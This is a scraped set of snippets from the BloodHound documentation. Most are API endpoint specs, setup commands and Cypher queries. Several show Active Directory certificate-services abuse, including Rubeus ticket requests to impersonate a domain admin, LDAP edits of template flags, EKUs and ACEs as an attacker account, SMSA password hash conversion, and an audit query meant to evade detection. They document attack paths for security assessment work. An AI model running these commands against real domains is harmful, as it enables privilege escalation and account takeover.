Requesting TGT with Certificate Using Rubeus in Windows\nDESCRIPTION: Uses Rubeus to request a Ticket Granting Ticket (TGT) from the domain using the previously generated certificate. The ticket will be passed into the current session, allowing the attacker to impersonate the target user.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6b.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n.\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt\n```\n\n----------------------------------------\n\nTITLE: Modifying Extended Key Usage (EKU) in PowerShell\nDESCRIPTION: PowerShell script to modify Extended Key Usage (EKU) attributes on a certificate template by removing the Client Authentication EKU. Connects to LDAP and updates pKIExtendedKeyUsage and msPKI-Certificate-Application-Policy attributes.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_10\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n$eku = \"1.3.6.1.5.5.7.3.2\" # Client Authentication EKU\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)\n$searcher = New-Object DirectoryServices.DirectorySearcher\n$searcher.SearchRoot = $ldap\n$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"\n$template = $searcher.FindOne().GetDirectoryEntry()\n\n# Remove EKU from attributes\n$template.Properties[\"pKIExtendedKeyUsage\"].Remove($eku) | Out-Null\n$template.Properties[\"msPKI-Certificate-Application-Policy\"].Remove($eku) | Out-Null\n$template.CommitChanges()\n$ldap.Close()\n```\n\n----------------------------------------\n\nTITLE: Setting Victim's Mail Attribute (Linux)\nDESCRIPTION: Sets the 'mail' attribute of the victim to a dummy email using ldapmodify if it's not already set.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: Creating AzureHound Enterprise Directory in PowerShell\nDESCRIPTION: Creates a new directory for AzureHound Enterprise in the Program Files folder using PowerShell.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nNew-Item 'C:\\Program Files\\AzureHound Enterprise' -ItemType Directory\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Computer Sessions\nDESCRIPTION: Specification for the API endpoint that retrieves sessions for a computer identified by its object_id. This endpoint is available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-sessions.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/sessions\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint for Computer Constrained Delegation Rights\nDESCRIPTION: OpenAPI specification for an endpoint that retrieves constrained delegation rights for a specified computer object. The endpoint requires an object_id parameter in the path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-constrained-delegation-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/constrained-delegation-rights\n```\n\n----------------------------------------\n\nTITLE: Deploying AzureHound on Kubernetes\nDESCRIPTION: Applies the AzureHound deployment configuration to the Kubernetes cluster.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nkubectl apply -f deployment.yaml\n```\n\n----------------------------------------\n\nTITLE: Create Clause in Cypher\nDESCRIPTION: This Cypher query demonstrates a create clause, which is filtered by default in the AST filter for sanitizing potentially dangerous openCypher language constructs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_25\n\nLANGUAGE: cypher\nCODE:\n```\nCREATE (V:Label {Name: 'my name'});\n```\n\n----------------------------------------\n\nTITLE: Running AzureHound Help Command\nDESCRIPTION: Command to display all available options in AzureHound by running the help flag.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/create-configuration.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nazurehound.exe -h\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for Saved Queries in BloodHound\nDESCRIPTION: Specification for the POST endpoint used to create or manage saved queries in BloodHound. This endpoint is available at /api/v2/saved-queries and is supported in both Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cypher/create-a-saved-query.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /api/v2/saved-queries\n```\n\n----------------------------------------\n\nTITLE: Acquiring Azure Resource Manager Token with Refresh Token\nDESCRIPTION: This code demonstrates how to obtain an Azure Resource Manager scoped JWT by providing a refresh token to the Get-ARMTokenWithRefreshToken function from the BARK toolkit.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-automation-contributor.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `\n    -TenantID \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Querying and Modifying Certificate Template Flags in PowerShell\nDESCRIPTION: PowerShell script to locate a certificate template in AD and modify its enrollment flags. Uses DirectoryServices to perform LDAP operations.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_14\n\nLANGUAGE: powershell\nCODE:\n```\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)\n$searcher = New-Object DirectoryServices.DirectorySearcher\n$searcher.SearchRoot = $ldap\n$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"\n$template = $searcher.FindOne().GetDirectoryEntry()\n\n# Flip flag\n$curValue = $template.Properties[\"msPKI-Enrollment-Flag\"].Value\n$template.Properties[\"msPKI-Enrollment-Flag\"].Value = $curValue -bxor $flagToFlip\n$template.CommitChanges()\n$ldap.Close()\n```\n\n----------------------------------------\n\nTITLE: Checking Victim Mail Attribute\nDESCRIPTION: Queries the mail attribute of the victim account using PowerView to verify if email requirements are met\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nGet-DomainObject -Identity VICTIM -Properties mail\n```\n\n----------------------------------------\n\nTITLE: Adding Owner to App Registration\nDESCRIPTION: Uses BARK's New-AppOwner function to add a new owner to an App Registration using the app's ObjectId, new owner's ObjectId, and authentication token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-owner.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nNew-AppOwner `\n    -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token\n```\n\n----------------------------------------\n\nTITLE: Creating Kubernetes Generic Secret for AzureHound (With Passphrase)\nDESCRIPTION: Creates a Kubernetes generic secret for AzureHound Enterprise with a passphrase for the private key.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nkubectl create secret generic azurehound-secret --from-literal tokenId=<bloodhound enterprise token id> --from-literal token=<bloodhound enterprise token> --from-literal keypass=<private key passphrase>\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Specification - GET Roles\nDESCRIPTION: OpenAPI specification defining the endpoint to retrieve roles from the BloodHound API.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/roles/list-roles.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/roles\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition - Container Retrieval\nDESCRIPTION: OpenAPI specification for retrieving container information via GET request with a specific object ID parameter in the URL path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/containers/get-container-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/containers/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Asset Management Compliance Mapping Table\nDESCRIPTION: Markdown table showing how BloodHound Enterprise's asset management capabilities map to various NIST compliance frameworks. Includes comprehensive inventory tracking of Active Directory and Azure assets through automated scanning.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/manage-bloodhound/compliance-framework/resources.mdx#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n|     |     |     |     |     |     |     |\n| --- | --- | --- | --- | --- | --- | --- |\n| **Control Category/Activity** | **How Does BloodHound Enterprise Satisfy This Control?** | **[NIST CSF v1.1](/manage-bloodhound/compliance-framework/nist-csf-v1-1)** | **[NIST CSF v2](/manage-bloodhound/compliance-framework/nist-csf-v2)** | **[NIST 800-171](/manage-bloodhound/compliance-framework/nist-sp-800-171)** | **[NIST 800-53 rev 8](/manage-bloodhound/compliance-framework/nist-sp-800-53)** |     |\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Computer RDP Rights in BloodHound\nDESCRIPTION: This OpenAPI specification defines an endpoint to retrieve Remote Desktop Protocol (RDP) access rights for a specific computer identified by its object_id. The endpoint is available in both BloodHound Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-rdp-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/rdp-rights\n```\n\n----------------------------------------\n\nTITLE: OpenAPI DELETE Endpoint for Saved Queries\nDESCRIPTION: This code snippet defines an OpenAPI endpoint for deleting a saved query by its ID in BloodHound. The endpoint uses the DELETE HTTP method and requires a saved query ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cypher/delete-a-saved-query.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /api/v2/saved-queries/{saved_query_id}\n```\n\n----------------------------------------\n\nTITLE: Execute NT Hash Conversion Script\nDESCRIPTION: Command to run the Python script for converting hex-encoded password to NT hash.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/dump-smsa-password.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npython3 nt.py 35f3e1713d61...\n```\n\n----------------------------------------\n\nTITLE: LDAP Certificate Template Management in Linux\nDESCRIPTION: Bash commands to query and modify certificate template attributes using ldapsearch and ldapmodify.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\nldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Enrollment-Flag\n```\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Enrollment-Flag\\nmsPKI-Enrollment-Flag: 0\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: Verifying TGT with klist (Windows)\nDESCRIPTION: Verifying that the TGT was successfully injected into the current session using the klist command.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6a.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nklist\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Group Information in BloodHound API (YAML)\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a GET endpoint to retrieve information about a specific group in BloodHound. It specifies the API version (v2) and the path parameter for the group's object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Verifying Domain Authentication\nDESCRIPTION: Command to verify domain authentication by attempting to view domain shares.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound.mdx#2025-04-23_snippet_4\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> net view \\\\contoso\\\n```\n\n----------------------------------------\n\nTITLE: Retrieving Users Associated with a GPO via API Endpoint\nDESCRIPTION: This OpenAPI endpoint definition describes how to fetch users associated with a specific Group Policy Object (GPO) in BloodHound using the object's unique identifier.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/gpos/get-gpo-entity-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/gpos/{object_id}/users\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Asset Group Collections in OpenAPI\nDESCRIPTION: Specifies the OpenAPI path for retrieving collections associated with an asset group. The endpoint uses a GET request and includes the asset group ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/asset-isolation/list-asset-group-collections.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/asset-groups/{asset_group_id}/collections\n```\n\n----------------------------------------\n\nTITLE: Retrieving SAML Provider Information by ID in OpenAPI\nDESCRIPTION: This code snippet defines the OpenAPI specification for a GET endpoint that retrieves information about a specific SAML provider by its ID. The endpoint path includes a path parameter for the SAML provider ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/auth/get-saml-provider.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/saml/providers/{saml_provider_id}\n```\n\n----------------------------------------\n\nTITLE: All Shortest Paths Lookup in Cypher\nDESCRIPTION: This Cypher query demonstrates a higher-cost all shortest paths lookup operation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_20\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p1 = allShortestPaths((p2:Person)-[:Knows *1..]->(p3:Person)) where p2.name = \"Jim\" and p3.name = \"Evil Jim\" return p1\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Domain OUs in OpenAPI\nDESCRIPTION: This OpenAPI specification defines the endpoint for retrieving organizational units (OUs) within a specific domain using the domain's object ID. The endpoint follows RESTful conventions for resource access.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-ous.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/ous\n```\n\n----------------------------------------\n\nTITLE: Defining GET API Endpoint for Clients in BloodHound OpenAPI Specification\nDESCRIPTION: This YAML snippet specifies the OpenAPI definition for a GET request to fetch client data. It's part of the BloodHound Enterprise Edition API, as indicated by the accompanying image tag.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/clients/list-clients.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/clients\n```\n\n----------------------------------------\n\nTITLE: Unpacking BloodHound CLI on Linux\nDESCRIPTION: Command to extract the downloaded BloodHound CLI tarball on Linux systems.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ntar -xvzf bloodhound-cli-linux-amd64.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Checking Certificate Template Signature Requirements in PowerShell\nDESCRIPTION: PowerShell script to check and modify the msPKI-RA-Signature attribute value of a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_16\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)\n$searcher = New-Object DirectoryServices.DirectorySearcher\n$searcher.SearchRoot = $ldap\n$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"\n$template = $searcher.FindOne().GetDirectoryEntry()\n\n# Print attribute\nWrite-Host \"msPKI-RA-Signature: $($template.Properties[\"msPKI-RA-Signature\"])\"\n$ldap.Close()\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate to PFX Format (Windows)\nDESCRIPTION: Converts the emitted certificate to PFX format using certutil.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\cert.pem .\\cert.pfx\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Group Controllables in BloodHound\nDESCRIPTION: OpenAPI specification for the endpoint that retrieves objects controllable by a specific group. The path includes a parameter for the group's object_id.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-controllables.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/controllables\n```\n\n----------------------------------------\n\nTITLE: Applying ACE to Target OU\nDESCRIPTION: Applies the created Access Control Entry to a specific Organizational Unit using its GUID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/contains.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$OU = Get-DomainOU -Raw (OU GUID)\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: Setting BloodHound Host Environment Variable\nDESCRIPTION: This snippet demonstrates how to set the BLOODHOUND_HOST environment variable in a .env file to allow connections from non-localhost sources.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/examples/docker-compose/README.md#2025-04-23_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nBLOODHOUND_HOST=0.0.0.0\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Domain Sparkline Endpoint Definition\nDESCRIPTION: OpenAPI specification defining the GET endpoint path for retrieving domain sparkline data. The endpoint requires a domain_id parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/attack-paths/list-attack-path-sparkline-values.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{domain_id}/sparkline\n```\n\n----------------------------------------\n\nTITLE: Getting Azure Tenant Data Quality Stats OpenAPI Definition\nDESCRIPTION: OpenAPI specification for endpoint that retrieves data quality statistics for a specific Azure tenant. The endpoint takes a tenant_id parameter in the path.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/data-quality/get-azure-tenant-data-quality-stats.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/azure-tenants/{tenant_id}/data-quality-stats\n```\n\n----------------------------------------\n\nTITLE: Defining DELETE API Endpoint for BloodHound User Secret in OpenAPI\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for deleting a BloodHound user's secret. It specifies the HTTP method (DELETE) and the endpoint path '/api/v2/bloodhound-users/{user_id}/secret', where {user_id} is a path parameter representing the ID of the user whose secret is to be deleted.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/expire-user-secret.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /api/v2/bloodhound-users/{user_id}/secret\n```\n\n----------------------------------------\n\nTITLE: Retrieving OU Relationships for GPO - OpenAPI Path Definition\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves OUs associated with a specific GPO identified by object_id. The endpoint follows RESTful conventions for resource access.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/gpos/get-gpo-entity-ous.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/gpos/{object_id}/ous\n```\n\n----------------------------------------\n\nTITLE: Finding Documentation API Endpoint Path\nDESCRIPTION: New API endpoint path for accessing finding documentation, replacing the current UI-based path. This will be the required path after the July 2024 release.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/release-notes/2024-06-17-v5-11-0.mdx#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n/api/v2/assets/findings/$finding_id/$doc_type.md\n```\n\n----------------------------------------\n\nTITLE: Unpacking BloodHound CLI on Windows\nDESCRIPTION: PowerShell commands to navigate to the Downloads folder and extract the BloodHound CLI zip file on Windows.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_4\n\nLANGUAGE: powershell\nCODE:\n```\ncd \"$env:USERPROFILE\\Downloads\"; tar -xf bloodhound-cli-windows-amd64.zip\n```\n\n----------------------------------------\n\nTITLE: Managing Certificate Template Access Control in PowerShell\nDESCRIPTION: PowerShell script to grant and verify enrollment rights on certificate templates using Active Directory access rules.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_17\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n$principalName = \"principal\" # SAM account name of principal\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$template = [ADSI]\"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n\n# Construct the ACE\n$objectTypeByteArray = [GUID]\"0e10c968-78fb-11d2-90d4-00c04f79dc55\"\n$inheritedObjectTypeByteArray = [GUID]\"00000000-0000-0000-0000-000000000000\"\n$account = New-Object System.Security.Principal.NTAccount($principalName)\n$sid = $account.Translate([System.Security.Principal.SecurityIdentifier])\n$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(\n$sid,\n[System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,\n[System.Security.AccessControl.AccessControlType]::Allow,\n$objectTypeByteArray,\n[System.Security.AccessControl.InheritanceFlags]::None,\n$inheritedObjectTypeByteArray\n)\n\n# Add the new ACE to the ACL\n$acl = $template.psbase.ObjectSecurity\n$acl.AddAccessRule($ace)\n$template.psbase.CommitChanges()\n```\n\n----------------------------------------\n\nTITLE: Querying SQL Server Audit Specifications for OpSec Assessment\nDESCRIPTION: This SQL query retrieves detailed information about server audit specifications in SQL Server, including which actions are being audited, to help attackers avoid detection.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_16\n\nLANGUAGE: sql\nCODE:\n```\nSELECT audit_id,\na.name as audit_name,\ns.name as server\\_specification\\_name,\nd.audit\\_action\\_name,\ns.is\\_state\\_enabled,\nd.is_group,\nd.audit\\_action\\_id,\ns.create_date,\ns.modify_date\nFROM sys.server_audits AS a\nJOIN sys.server\\_audit\\_specifications AS s\nON a.audit_guid = s.audit_guid\nJOIN sys.server\\_audit\\_specification_details AS d\nON s.server\\_specification\\_id = d.server\\_specification\\_id\n```\n\n----------------------------------------\n\nTITLE: GET Endpoint for User Constrained Delegation Rights in BloodHound API\nDESCRIPTION: This OpenAPI specification defines the GET endpoint for retrieving constrained delegation rights for a specific user. The endpoint requires the user's object ID as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-constrained-delegation-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/constrained-delegation-rights\n```\n\n----------------------------------------\n\nTITLE: Generating Latest Schema for BloodHound using Just\nDESCRIPTION: This command uses the 'just' task runner to execute the 'schemagen' task, which generates the latest schema files for the BloodHound project.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/schemagen/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\njust schemagen\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI endpoint for domain foreign groups in BloodHound\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves foreign groups for a specific domain identified by its object_id. This endpoint is available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-foregin-groups.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/foreign-groups\n```\n\n----------------------------------------\n\nTITLE: Adding Curved Edge in Sigmajs for BloodHound\nDESCRIPTION: Demonstrates how to add a curved edge type that displays groups of edges as quadratic bezier curves. It requires groupSize, groupPosition, and optional direction values to be passed with the edge.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/src/rendering/RENDERING.md#2025-04-23_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ngraph.addEdgeWithKey(key, edge.source, edge.target, {\n    size: 3,\n    type: 'curved',\n    label: edge.label,\n    color: '#406F8E',\n    groupPosition: 5,\n    groupSize: 10,\n    direction: EdgeDirection.BACKWARDS\n});\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET User Endpoint Definition\nDESCRIPTION: OpenAPI/Swagger specification for the GET endpoint that retrieves user details by their object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Admin Users for a Specific Computer in BloodHound\nDESCRIPTION: This OpenAPI endpoint allows querying admin users associated with a specific computer in BloodHound. The endpoint requires the computer's object_id as a path parameter to identify the target computer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-admins.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/admin-users\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Edge Composition in OpenAPI\nDESCRIPTION: Specifies the OpenAPI route for retrieving edge composition data from BloodHound's graph database. This endpoint is accessible via GET request to /api/v2/graphs/edge-composition.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/graph/get-path-composition.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/graphs/edge-composition\n```\n\n----------------------------------------\n\nTITLE: Shortest Path Lookup in Cypher\nDESCRIPTION: This Cypher query shows a low-cost shortest path lookup operation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_19\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p1 = shortestPath((p2:Person)-[:Knows *1..]->(p3:Person)) where p2.name = \"Jim\" and p3.name = \"Evil Jim\" return p1\n```\n\n----------------------------------------\n\nTITLE: Unpacking BloodHound CLI on Mac\nDESCRIPTION: Command to extract the downloaded BloodHound CLI tarball on Mac systems.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ntar -xvzf bloodhound-cli-darwin-arm64.tar.gz\n```\n\n----------------------------------------\n\nTITLE: BloodHound Certificate Template Permission Query\nDESCRIPTION: Cypher query to check if a principal has enrollment rights on a certificate template through BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_18\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH p = (x)-[:MemberOf*0..]->()-[:Enroll|AllExtendRights|GenericAll]->(ct:CertTemplate)\nWHERE x.name = \"PRINCIPAL@DOMAIN.NAME\" AND ct.name = \"CERTTEMPLATE@DOMAIN.NAME\"\nRETURN p\n```\n\n----------------------------------------\n\nTITLE: Checking GenericAll Permissions on Certificate Template in PowerShell\nDESCRIPTION: This PowerShell snippet checks the GenericAll permissions granted to a principal on a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_5\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n$principalName = \"principal\" # SAM account name of 